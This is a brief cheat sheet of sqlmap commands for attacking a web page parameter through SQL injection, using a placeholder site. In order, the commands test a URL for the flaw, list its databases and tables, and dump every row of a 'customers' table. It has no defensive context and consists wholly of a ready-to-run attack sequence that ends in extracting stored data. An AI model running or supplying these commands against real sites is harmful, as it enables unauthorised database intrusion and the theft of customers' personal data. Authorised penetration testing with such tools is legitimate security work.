#### Test parameters for SQL injection vulnerability
***Always start with a valid URL! Always put the URL in quotes!***
```
sqlmap -u 'http://www.site.com/page&param=1?param=2'
```

#### Enumerate databases
```
sqlmap -u 'http://www[...]=1?param=2' --dbs
```

#### Enumerate tables for the selected database `dbname`
```
sqlmap -u 'http://www.[...]=1?param=2' -D dbname --tables
```

#### Retrieve all rows in the customers `dbname.customers` table
```
sqlmap -u 'http://www.[...]=1?param=2' -D dbname -T customers --dump
```